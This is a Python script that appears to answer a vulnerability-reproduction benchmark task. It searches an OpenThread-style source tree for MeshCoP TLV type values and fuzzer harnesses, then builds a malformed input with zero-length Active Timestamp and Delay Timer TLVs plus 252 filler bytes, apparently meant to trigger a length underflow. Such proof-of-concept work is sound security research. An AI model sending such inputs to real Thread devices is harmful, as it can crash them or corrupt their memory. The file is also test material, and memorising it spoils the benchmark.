import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_files_from_src(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                try:
                    with open(path, "rb") as f:
                        yield path, f.read()
                except OSError:
                    continue
    else:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    yield m.name, f.read()
                except Exception:
                    continue


def _decode_text(data: bytes) -> str:
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _collect_text_sources(src_path: str) -> Dict[str, str]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp")
    out: Dict[str, str] = {}
    for name, data in _iter_files_from_src(src_path):
        lower = name.lower()
        if not lower.endswith(exts):
            continue
        if len(data) > 6_000_000:
            continue
        out[name] = _decode_text(data)
    return out


def _find_int_assignment(text: str, symbol: str) -> Optional[int]:
    # Try common patterns: symbol = 0xNN / symbol = NN
    pat = re.compile(r"\b" + re.escape(symbol) + r"\b\s*=\s*(0x[0-9a-fA-F]+|\d+)\b")
    m = pat.search(text)
    if not m:
        return None
    v = m.group(1)
    try:
        return int(v, 0)
    except Exception:
        return None


def _infer_tlv_types(texts: Dict[str, str]) -> Dict[str, int]:
    keys = ["kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"]
    found: Dict[str, int] = {}

    preferred_paths = []
    for p in texts.keys():
        pl = p.lower()
        if "tlv" in pl or "meshcop" in pl or "dataset" in pl:
            preferred_paths.append(p)
    scan_paths = preferred_paths + [p for p in texts.keys() if p not in preferred_paths]

    for p in scan_paths:
        t = texts[p]
        for k in keys:
            if k in found:
                continue
            v = _find_int_assignment(t, k)
            if v is not None and 0 <= v <= 255:
                found[k] = v

        if len(found) == len(keys):
            break

    # Fallbacks per Thread MeshCoP TLV assignments (commonly used by OpenThread)
    found.setdefault("kActiveTimestamp", 0x0E)
    found.setdefault("kPendingTimestamp", 0x33)
    found.setdefault("kDelayTimer", 0x34)
    return found


def _collect_fuzzer_sources(texts: Dict[str, str]) -> List[Tuple[str, str]]:
    fuzzers = []
    for p, t in texts.items():
        if "LLVMFuzzerTestOneInput" in t:
            fuzzers.append((p, t))
    return fuzzers


def _pick_relevant_fuzzer(fuzzers: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    if not fuzzers:
        return None

    keywords = [
        ("dataset", 5),
        ("meshcop", 4),
        ("timestamp", 3),
        ("delay", 3),
        ("tlv", 3),
        ("otdataset", 4),
        ("isTlvValid".lower(), 6),
        ("mgmt", 2),
        ("coap", 1),
    ]

    best = None
    best_score = -1
    for p, t in fuzzers:
        tl = t.lower()
        score = 0
        for kw, w in keywords:
            score += tl.count(kw) * w
        # Prefer file names that look like dataset fuzzers
        pl = p.lower()
        if "dataset" in pl:
            score += 10
        if "meshcop" in pl:
            score += 5
        if score > best_score:
            best_score = score
            best = (p, t)
    return best


def _infer_input_offset_from_fuzzer_text(fuzzer_text: str) -> int:
    tl = fuzzer_text

    # Look specifically for dataset TLV setters and an obvious data+N.
    call_markers = [
        "otDatasetSetActiveTlvs",
        "otDatasetSetPendingTlvs",
        "otDatasetSetActive",
        "otDatasetSetPending",
        "Dataset::",
        "IsTlvValid",
    ]

    relevant = any(m in tl for m in call_markers)
    if not relevant:
        return 0

    # Try patterns like: data + 1, Data + 1, aData + 1, &data[1]
    candidates: List[int] = []
    for m in re.finditer(r"\b[a-zA-Z_]\w*\s*\+\s*(\d+)\b", tl):
        try:
            v = int(m.group(1))
            if 0 <= v <= 64:
                candidates.append(v)
        except Exception:
            pass
    for m in re.finditer(r"&\s*\b[a-zA-Z_]\w*\s*\[\s*(\d+)\s*\]", tl):
        try:
            v = int(m.group(1))
            if 0 <= v <= 64:
                candidates.append(v)
        except Exception:
            pass

    if not candidates:
        return 0

    # Heuristic: pick the smallest positive offset seen.
    positives = [c for c in candidates if c > 0]
    if not positives:
        return 0
    return min(positives)


def _make_malicious_tlvs(active_ts_type: int, delay_type: int) -> bytes:
    # Intentionally set length=0 for TLVs that require minimum length.
    # Provide 252 trailing bytes to satisfy likely uint8 underflow from min length 4.
    filler_len = 252
    filler = b"A" * filler_len
    return bytes([active_ts_type & 0xFF, 0x00, delay_type & 0xFF, 0x00]) + filler


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = _collect_text_sources(src_path)
        tlv_types = _infer_tlv_types(texts)

        fuzzers = _collect_fuzzer_sources(texts)
        picked = _pick_relevant_fuzzer(fuzzers)
        offset = 0
        if picked is not None:
            _, fuzzer_text = picked
            offset = _infer_input_offset_from_fuzzer_text(fuzzer_text)

        payload = _make_malicious_tlvs(tlv_types["kActiveTimestamp"], tlv_types["kDelayTimer"])
        if offset > 0:
            payload = (b"\x00" * offset) + payload
        return payload